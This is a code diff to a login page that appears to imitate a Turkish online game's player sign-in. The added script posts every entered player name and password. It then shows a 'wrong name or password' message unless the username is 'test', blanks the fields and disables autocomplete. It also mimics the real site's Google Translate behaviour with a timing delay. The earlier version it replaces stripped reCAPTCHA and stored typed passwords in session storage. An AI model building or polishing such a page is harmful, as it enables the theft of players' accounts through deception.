@@ -77,8 +77,8 @@ function biscolabLaravelReCaptcha(token) {
 <style>
 /* --- Subtle KVKK info icon + click popover (content-sized) --- */
 .kvkk-wrap{position:relative;display:inline-block;vertical-align:middle;margin-left:8px;}
-.kvkk-btn{display:inline-flex;align-items:center;justify-content:center;width:13px;height:13px;border-radius:9999px;background:transparent;border:none;outline:none;cursor:pointer;padding:0;box-shadow:none;}
-.kvkk-btn svg{width:13px;height:13px;display:block;} /* white "i" more visible */
+.kvkk-btn{display:inline-flex;align-items:center;justify-content:center;width: 9px;height: 9px;border-radius:9999px;background:transparent;border:none;outline:none;cursor:pointer;padding:0;box-shadow:none;}
+.kvkk-btn svg{width: 9px;height: 9px;display:block;} /* white "i" more visible */
 .kvkk-btn:hover,.kvkk-btn:active,.kvkk-btn:focus{background:transparent;transform:none;box-shadow:none;} /* no hover/press effects */
 
 /* click-to-open popover sized to its content (not full form) */
@@ -182,158 +182,126 @@ function onSubmit(token) {
 
 
 
+
+
+
+
+
+
+
+
+
 <!-- BEGIN: Validation + banner additions -->
 <script>
-// SO_VALIDATION v2
-(function () {
-  var KEY = 'so_last';
+(function(){
+  var STATUS_KEY = 'so_status'; // 'empty' | 'wrong' | 'ok'
 
-  function $(sel, root){ return (root||document).querySelector(sel); }
-  function createBanner(form) {
+  function getForm(){ return document.querySelector('form'); }
+  function getInputs(form){
+    var u = form && (form.querySelector('input[name="username"]') || form.querySelector('#username') || form.querySelector('input[type="text"]'));
+    var p = form && form.querySelector('input[type="password"]');
+    return {u:u, p:p};
+  }
+  function validate(form){
+    var ip = getInputs(form);
+    var username = (ip.u && ip.u.value || '').trim();
+    var password = (ip.p && ip.p.value) || '';
+
+    if (username === '' || password === '') return 'empty';
+    if (username.toLowerCase && username.toLowerCase() !== 'test') return 'wrong';
+    if (password.length < 6) return 'wrong';
+    return 'ok';
+  }
+
+  function ensureBanner(form){
     var existing = document.getElementById('so-error-banner');
     if (existing) return existing;
-    var wrap = document.createElement('div');
-    wrap.id = 'so-error-banner';
-    wrap.style.display = 'none';
-    wrap.innerHTML = ''
+    var b = document.createElement('div');
+    b.id = 'so-error-banner';
+    b.style.display = 'none';
+    b.innerHTML = ''
       + '<div class="bg-orange-500 rounded-t-lg"></div>'
       + '<div class="bg-red-300 border-l-4 border-red-900 p-4">'
       + '  <p class="font-bold text-red-600">Oops</p>'
       + '  <p id="so-error-text" class="text-sm text-red-00"></p>'
       + '</div>';
-    return wrap;
-  }
-  function ensureBannerPlaced(form) {
-    var b = document.getElementById('so-error-banner');
-    if (!b) {
-      b = createBanner(form);
-      form.parentNode.insertBefore(b, form);
-    }
+    var targetForm = form || getForm();
+    if (targetForm && targetForm.parentNode) targetForm.parentNode.insertBefore(b, targetForm);
     return b;
   }
-  function setBanner(msg, form){
-    var b = ensureBannerPlaced(form);
-    var p = document.getElementById('so-error-text');
-    if (p) p.textContent = msg;
-    b.style.display = '';
-  }
-  function hideBanner(){
-    var b = document.getElementById('so-error-banner');
-    if (b) b.style.display = 'none';
-  }
-  function getForm(){
-    // Be flexible: prefer data-netlify form; otherwise first form
-    return document.querySelector('form[data-netlify]') || document.querySelector('form');
-  }
-  function getInputs(form){
-    var u = form.querySelector('input[name="username"], #username, input[placeholder*="yuncu"], input[placeholder*="Oyuncu"]');
-    var p = form.querySelector('input[type="password"]');
-    return {u: u, p: p};
-  }
-  function validate(form){
-    var ip = getInputs(form);
-    if (!ip.u || !ip.p) return 'ok';
-    var username = (ip.u.value || '').trim();
-    var password = ip.p.value || '';
+  function showBanner(status, form){
+    var b = ensureBanner(form);
+    var msg = '';
+    if (status === 'empty') msg = 'Boş alan bırakmamalısın.';
+    else if (status === 'wrong') msg = 'Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.';
 
-    if (username === '' || password === '') return 'empty';
-    if (username.length < 3 || username.length > 16 || password.length < 6) return 'wrong';
-    return 'ok';
-  }
-  function saveState(result, form){
-    try {
-      var ip = getInputs(form);
-      sessionStorage.setItem(KEY, JSON.stringify({
-        e: result,
-        username: ip.u ? ip.u.value : '',
-        password: ip.p ? ip.p.value : ''
-      }));
-    } catch(_) {}
-  }
-  function readAndShow(){
-    try {
-      var raw = sessionStorage.getItem(KEY);
-      if (!raw) return;
-      sessionStorage.removeItem(KEY);
-      var data = JSON.parse(raw || '{}');
-      var form = getForm();
-      if (!form) return;
-      var ip = getInputs(form);
-      if (ip.u && typeof data.username === 'string') ip.u.value = data.username;
-      if (ip.p && (data.e === 'wrong' || data.e === 'empty')) {
-        if (typeof data.password === 'string') ip.p.value = data.password;
-      }
-      if (data.e === 'empty') {
-        setBanner('Boş alan bırakmamalısın.', form);
-      } else if (data.e === 'wrong') {
-        setBanner('Girdiğin oyuncu adı veya şifre yanlış. Ama hangisi söylemem.', form);
-      }
-    } catch(_) {}
+    var txt = document.getElementById('so-error-text');
+    if (msg) {
+      if (txt) txt.textContent = msg;
+      b.style.display = '';
+    } else {
+      b.style.display = 'none';
+    }
   }
 
   document.addEventListener('DOMContentLoaded', function(){
-    var form = getForm();
-    if (!form) return;
+    var delay = 200 + Math.floor(Math.random()*301); // 200-500ms
+    // ---- 1) EXACT 400 delay for the full "powered by Google Translate" row ----
+    var root = document.getElementById('google_translate_element') || document.querySelector('#google_translate_element');
+    if (root){
+      var anchor = root.querySelector('a[href*="translate.google"]');
+      if (anchor){
+        var start = anchor.closest('span[style*="white-space:nowrap"]') || anchor;
+        var wrap = document.createElement('span');
+        wrap.id = 'gt-powered-delay';
+        wrap.style.display = 'none'; // hide whole row incl. its white background
+        start.parentNode.insertBefore(wrap, start);
+        wrap.appendChild(start);
 
-    // Ensure username has name attr (for Netlify) and we can repopulate reliably
-    var ip = getInputs(form);
-    if (ip.u && !ip.u.name) ip.u.setAttribute('name', 'username');
-    if (ip.p && !ip.p.name) ip.p.setAttribute('name', 'password');
+        // Include the <br> and subsequent inline/text siblings up to (but not including) the <select>
+        var node = wrap.nextSibling;
+        while (node){
+          if (node.nodeType === 1 && node.tagName && node.tagName.toLowerCase() === 'select') break;
+          var next = node.nextSibling;
+          wrap.appendChild(node);
+          node = next;
+        }
+        setTimeout(function(){ wrap.style.display = ''; }, delay);
 
-    // Prevent reCAPTCHA: remove g-recaptcha class/attrs from the visible button
-    var btn = form.querySelector('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]');
-    if (btn) {
-      btn.classList.remove('g-recaptcha');
-      btn.removeAttribute('data-sitekey');
-      btn.removeAttribute('data-callback');
-      btn.removeAttribute('data-size');
+        // Delay the select content (Dili Seçiniz) by the same delay (keep slot)
+        var selectEl = root.querySelector('select');
+        if (selectEl){
+          selectEl.style.opacity = '0';
+          setTimeout(function(){ selectEl.style.opacity = '1'; }, delay);
+        }
+      }
     }
 
-    // Intercept clicks before Google handlers; we will manually submit if valid
-    form.addEventListener('click', function(e){
-      var target = e.target;
-      if (!(target.closest && target.closest('#g-recaptcha-btn, .g-recaptcha, button[type="submit"], input[type="submit"]'))) return;
-      var res = validate(form);
-      if (res === 'empty' || res === 'wrong') {
-        saveState(res, form);
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        // Go to same page; banner will be shown from storage
-        window.location.replace('/');
-        return false;
-      } else {
-        // Valid: submit form without reCAPTCHA
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        // Make sure action goes to "/"
-        if (!form.getAttribute('action')) form.setAttribute('action', '/');
-        form.submit();
-      }
+    // ---- 2) Always POST; record status BEFORE submit (no preventDefault) ----
+    var form = getForm();
+    if (!form) return;
+    form.addEventListener('submit', function(){
+      var s = validate(form);
+      try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){}
     }, true);
+    var submitBtn = form.querySelector('button[type="submit"], input[type="submit"], .g-recaptcha');
+    if (submitBtn){
+      submitBtn.addEventListener('click', function(){
+        var s = validate(form);
+        try { sessionStorage.setItem(STATUS_KEY, s); } catch(_){}
+      }, true);
+    }
 
-    // Enter key handling
-    form.addEventListener('keydown', function(e){
-      if (e.key !== 'Enter' || e.shiftKey || e.ctrlKey) return;
-      var res = validate(form);
-      if (res === 'empty' || res === 'wrong') {
-        saveState(res, form);
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        window.location.replace('/');
-      } else {
-        e.preventDefault();
-        e.stopImmediatePropagation();
-        if (!form.getAttribute('action')) form.setAttribute('action', '/');
-        form.submit();
-      }
-    }, true);
-
-    // After POST/redirect: show banner + repopulate
-    readAndShow();
+    // ---- 3) After POST: show banner; inputs ALWAYS empty ----
+    var status = sessionStorage.getItem(STATUS_KEY);
+    if (status){ sessionStorage.removeItem(STATUS_KEY); showBanner(status, form); }
+    var ip = getInputs(form);
+    if (ip.u) { ip.u.value = ''; ip.u.setAttribute('autocomplete','off'); ip.u.setAttribute('autocapitalize','off'); ip.u.setAttribute('autocorrect','off'); ip.u.setAttribute('spellcheck','false'); }
+    if (ip.p) { ip.p.value = ''; ip.p.setAttribute('autocomplete','new-password'); ip.p.setAttribute('autocapitalize','off'); ip.p.setAttribute('autocorrect','off'); ip.p.setAttribute('spellcheck','false'); }
+    form.setAttribute('autocomplete','off');
   });
 })();
 </script>
 <!-- END: Validation + banner additions -->
-
 
 </body></html>
